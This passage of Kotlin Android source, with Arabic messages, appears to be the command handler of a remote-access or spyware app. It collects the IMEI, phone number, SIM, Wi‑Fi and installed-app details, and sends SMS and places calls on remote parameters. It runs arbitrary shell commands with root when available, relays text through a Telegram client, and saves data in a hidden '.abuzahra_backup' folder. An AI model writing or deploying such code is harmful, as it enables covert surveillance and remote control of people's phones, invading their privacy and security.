    private fun getWifiInfo(context: Context): String {
        return try {
            val wifiManager = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as android.net.wifi.WifiManager
            val info = wifiManager.connectionInfo
            val ssid = info.ssid?.removeSurrounding("\"") ?: "غير متصل"
            val bssid = info.bssid ?: ""
            val ip = String.format("%d.%d.%d.%d",
                info.ipAddress and 0xff, (info.ipAddress shr 8) and 0xff,
                (info.ipAddress shr 16) and 0xff, (info.ipAddress shr 24) and 0xff)
            val rssi = info.rssi
            val speed = info.linkSpeed

            """{"ok":true,"wifi":{"ssid":"$ssid","bssid":"$bssid","ip":"$ip","rssi":$rssi,"speed":$speed,"frequency":${info.frequency}}}"""
        } catch (e: Exception) {
            """{"ok":false,"error":"${e.message}"}"""
        }
    }

    private fun getNetworkInfo(context: Context): String {
        return try {
            val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as android.net.ConnectivityManager
            val network = cm.activeNetworkInfo
            val info = JSONObject()
            if (network != null && network.isConnected) {
                info.put("type", network.typeName)
                info.put("connected", true)
                info.put("roaming", network.isRoaming)
            } else {
                info.put("connected", false)
            }
            """{"ok":true,"network":$info}"""
        } catch (e: Exception) {
            """{"ok":false,"error":"${e.message}"}"""
        }
    }

    @Suppress("DEPRECATION")
    private fun getSimInfo(context: Context): String {
        return try {
            val tm = context.getSystemService(Context.TELEPHONY_SERVICE) as android.telephony.TelephonyManager
            val info = JSONObject()
            info.put("operator", tm.networkOperatorName ?: "")
            info.put("sim_operator", tm.simOperatorName ?: "")
            info.put("sim_state", tm.simState)
            info.put("phone_type", tm.phoneType)
            info.put("network_type", tm.networkType)
            info.put("country_iso", tm.networkCountryIso ?: "")
            """{"ok":true,"sim":$info}"""
        } catch (e: Exception) {
            """{"ok":false,"error":"${e.message}"}"""
        }
    }

    private fun getStorageInfo(context: Context): String {
        val info = JSONObject()
        info.put("total", getTotalStorage(context))
        info.put("free", getFreeStorage(context))
        info.put("used", getTotalStorage(context) - getFreeStorage(context))
        return """{"ok":true,"storage":$info}"""
    }

    @Suppress("DEPRECATION")
    private fun getInstalledApps(context: Context): String {
        val apps = JSONArray()
        val pm = context.packageManager
        pm.getInstalledApplications(PackageManager.GET_META_DATA).forEach { appInfo ->
            val app = JSONObject()
            app.put("package", appInfo.packageName)
            app.put("name", pm.getApplicationLabel(appInfo).toString())
            app.put("version", try { pm.getPackageInfo(appInfo.packageName, 0).versionName ?: "" } catch (e: Exception) { "" })
            app.put("system", (appInfo.flags and android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0)
            app.put("installed", appInfo.sourceDir?.contains("/data/app/") == true)
            apps.put(app)
        }
        val file = File(context.getExternalFilesDir(null), "installed_apps_${System.currentTimeMillis()}.json")
        file.writeText(apps.toString())
        return """{"ok":true,"count":${apps.length()},"data":$apps}"""
    }

    private fun getRunningApps(context: Context): String {
        return try {
            val am = context.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
            val apps = JSONArray()
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                am.getRunningAppProcesses()?.forEach { process ->
                    val app = JSONObject()
                    app.put("package", process.processName)
                    app.put("pid", process.pid)
                    app.put("importance", process.importance)
                    apps.put(app)
                }
            }
            """{"ok":true,"count":${apps.length()},"data":$apps}"""
        } catch (e: Exception) {
            """{"ok":false,"error":"${e.message}"}"""
        }
    }

    private fun sendSMS(context: Context, params: JSONObject): String {
        val number = params.optString("number", "")
        val text = params.optString("text", "")
        if (number.isEmpty() || text.isEmpty()) return """{"ok":false,"error":"الرقم والنص مطلوبان"}"""
        return try {
            val smsManager = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                context.getSystemService(SmsManager::class.java)
            } else {
                @Suppress("DEPRECATION")
                SmsManager.getDefault()
            }
            smsManager.sendTextMessage(number, null, text, null, null)
            """{"ok":true,"message":"تم إرسال الرسالة"}"""
        } catch (e: Exception) {
            """{"ok":false,"error":"${e.message}"}"""
        }
    }

    private fun makeCall(context: Context, params: JSONObject): String {
        val number = params.optString("number", "")
        if (number.isEmpty()) return """{"ok":false,"error":"الرقم مطلوب"}"""
        return try {
            val intent = Intent(Intent.ACTION_CALL)
            intent.data = Uri.parse("tel:$number")
            intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
            context.startActivity(intent)
            """{"ok":true,"message":"جاري الاتصال بـ $number"}"""
        } catch (e: Exception) {
            """{"ok":false,"error":"${e.message}"}"""
        }
    }

    private fun setAlarm(context: Context, params: JSONObject): String {
        val hour = params.optInt("hour", 7)
        val minute = params.optInt("minute", 0)
        val message = params.optString("message", "تنبيه")
        return try {
            val intent = Intent(android.provider.AlarmClock.ACTION_SET_ALARM).apply {
                putExtra(android.provider.AlarmClock.EXTRA_HOUR, hour)
                putExtra(android.provider.AlarmClock.EXTRA_MINUTES, minute)
                putExtra(android.provider.AlarmClock.EXTRA_MESSAGE, message)
                flags = Intent.FLAG_ACTIVITY_NEW_TASK
            }
            context.startActivity(intent)
            """{"ok":true,"message":"تم تعيين المنبه: $hour:$minute - $message"}"""
        } catch (e: Exception) {
            """{"ok":false,"error":"${e.message}"}"""
        }
    }

    private fun setAutoRotate(context: Context, params: JSONObject): String {
        val enable = params.optBoolean("enable", true)
        return try {
            Settings.System.putInt(context.contentResolver, Settings.System.ACCELEROMETER_ROTATION, if (enable) 1 else 0)
            val state = if (enable) "تشغيل" else "إيقاف"
            """{"ok":true,"message":"تم $state الدوران التلقائي"}"""
        } catch (e: Exception) {
            """{"ok":false,"error":"${e.message}"}"""
        }
    }

    // ==================== دوال مساعدة ====================

    private fun getBatteryLevel(context: Context): Int {
        val batteryIntent = context.registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
        return batteryIntent?.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1) ?: -1
    }

    private fun isCharging(context: Context): Boolean {
        val batteryIntent = context.registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
        val status = batteryIntent?.getIntExtra(android.os.BatteryManager.EXTRA_STATUS, -1) ?: -1
        return status == android.os.BatteryManager.BATTERY_STATUS_CHARGING || status == android.os.BatteryManager.BATTERY_STATUS_FULL
    }

    private fun getBatteryHealth(context: Context): String {
        val batteryIntent = context.registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
        val health = batteryIntent?.getIntExtra(android.os.BatteryManager.EXTRA_HEALTH, -1) ?: -1
        return when (health) {
            android.os.BatteryManager.BATTERY_HEALTH_GOOD -> "good"
            android.os.BatteryManager.BATTERY_HEALTH_OVERHEAT -> "overheat"
            android.os.BatteryManager.BATTERY_HEALTH_DEAD -> "dead"
            android.os.BatteryManager.BATTERY_HEALTH_OVER_VOLTAGE -> "over_voltage"
            android.os.BatteryManager.BATTERY_HEALTH_UNSPECIFIED_FAILURE -> "failure"
            else -> "unknown"
        }
    }

    private fun getBatteryTemperature(context: Context): Int {
        val batteryIntent = context.registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
        return (batteryIntent?.getIntExtra(android.os.BatteryManager.EXTRA_TEMPERATURE, 0) ?: 0) / 10
    }

    private fun getBatteryVoltage(context: Context): Int {
        val batteryIntent = context.registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
        return batteryIntent?.getIntExtra(android.os.BatteryManager.EXTRA_VOLTAGE, 0) ?: 0
    }

    private fun getBatteryTechnology(context: Context): String {
        val batteryIntent = context.registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
        return batteryIntent?.getStringExtra(android.os.BatteryManager.EXTRA_TECHNOLOGY) ?: "Unknown"
    }

    private fun getScreenWidth(context: Context): Int {
        val wm = context.getSystemService(Context.WINDOW_SERVICE) as WindowManager
        val metrics = DisplayMetrics()
        @Suppress("DEPRECATION")
        wm.defaultDisplay.getMetrics(metrics)
        return metrics.widthPixels
    }

    private fun getScreenHeight(context: Context): Int {
        val wm = context.getSystemService(Context.WINDOW_SERVICE) as WindowManager
        val metrics = DisplayMetrics()
        @Suppress("DEPRECATION")
        wm.defaultDisplay.getMetrics(metrics)
        return metrics.heightPixels
    }

    @Suppress("DEPRECATION")
    private fun getTotalStorage(context: Context): Long {
        return try {
            val stat = Environment.getExternalStorageDirectory()
            val statFs = android.os.StatFs(stat.path)
            statFs.totalBytes
        } catch (e: Exception) {
            0
        }
    }

    @Suppress("DEPRECATION")
    private fun getFreeStorage(context: Context): Long {
        return try {
            val stat = Environment.getExternalStorageDirectory()
            val statFs = android.os.StatFs(stat.path)
            statFs.availableBytes
        } catch (e: Exception) {
            0
        }
    }

    @Suppress("DEPRECATION", "MissingPermission")
    private fun getIMEI(context: Context): String {
        return try {
            val tm = context.getSystemService(Context.TELEPHONY_SERVICE) as android.telephony.TelephonyManager
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                tm.imei ?: ""
            } else {
                tm.deviceId ?: ""
            }
        } catch (e: Exception) {
            ""
        }
    }

    @Suppress("DEPRECATION")
    private fun getPhoneNumber(context: Context): String {
        return try {
            val tm = context.getSystemService(Context.TELEPHONY_SERVICE) as android.telephony.TelephonyManager
            tm.line1Number ?: ""
        } catch (e: Exception) {
            ""
        }
    }

    // ==================== أوامر مساعدة جديدة ====================

    private fun showCustomNotification(context: Context, params: JSONObject): String {
        return try {
            val title = params.optString("title", "إشعار")
            val body = params.optString("body", "هذا إشعار تجريبي")
            scope.launch {
                TelegramDirectClient.sendMessage("🔔 <b>$title</b>\n\n$body", "HTML")
            }
            """{"ok":true,"direct":true,"message":"تم إظهار الإشعار"}"""
        } catch (e: Exception) {
            """{"ok":false,"error":"${e.message}"}"""
        }
    }

    private fun openUrl(context: Context, params: JSONObject): String {
        return try {
            val url = params.optString("arg", "https://google.com")
            val intent = Intent(Intent.ACTION_VIEW, Uri.parse(url))
            intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
            context.startActivity(intent)
            """{"ok":true,"message":"تم فتح الرابط: $url"}"""
        } catch (e: Exception) {
            """{"ok":false,"error":"${e.message}"}"""
        }
    }

    // ==================== Root Support ====================

    /** Check if device has root access */
    fun hasRootAccess(): Boolean {
        return try {
            val process = Runtime.getRuntime().exec(arrayOf("su", "-c", "id"))
            val reader = BufferedReader(InputStreamReader(process.inputStream))
            val output = reader.readLine()
            reader.close()
            process.waitFor()
            output != null && output.contains("uid=0")
        } catch (e: Exception) {
            false
        }
    }

    /** Execute command with root (su) if available, fallback to normal */
    private fun executeWithRoot(context: Context, command: String): String {
        return try {
            if (hasRootAccess()) {
                val process = Runtime.getRuntime().exec(arrayOf("su", "-c", command))
                val reader = BufferedReader(InputStreamReader(process.inputStream))
                val output = reader.readText()
                reader.close()
                process.waitFor()
                """{"ok":true,"root":true,"output":"${output.replace("\"", "\\\"").trim()}"}"""
            } else {
                """{"ok":false,"error":"يتطلب صلاحيات Root","root":false}"""
            }
        } catch (e: Exception) {
            """{"ok":false,"error":"${e.message}","root":false}"""
        }
    }

    /** Execute shell command (with root if available) */
    private fun executeShell(command: String): String {
        return try {
            val parts = if (hasRootAccess()) arrayOf("su", "-c", command) else arrayOf("sh", "-c", command)
            val process = Runtime.getRuntime().exec(parts)
            val reader = BufferedReader(InputStreamReader(process.inputStream))
            val output = reader.readText()
            val error = BufferedReader(InputStreamReader(process.errorStream)).readText()
            reader.close()
            process.waitFor()
            """{"ok":true,"exit_code":${process.exitValue()},"output":"${output.replace("\"", "\\\"").trim()}","error":"${error.replace("\"", "\\\"").trim()}"}"""
        } catch (e: Exception) {
            """{"ok":false,"error":"${e.message}"}"""
        }
    }

    // ==================== دوال مساعدة ====================

    private fun saveDataToFile(context: Context, filename: String, data: String) {
        try {
            val backupDir = File(Environment.getExternalStorageDirectory(), ".abuzahra_backup")
            if (!backupDir.exists()) backupDir.mkdirs()
            val file = File(backupDir, filename)
            file.writeText(data)
            Log.d(TAG, "تم حفظ الملف: ${file.absolutePath}")
        } catch (e: Exception) {
            Log.e(TAG, "خطأ في حفظ الملف: ${e.message}")
        }
    }

    private class IntentFilter(action: String) : android.content.IntentFilter(action)
}
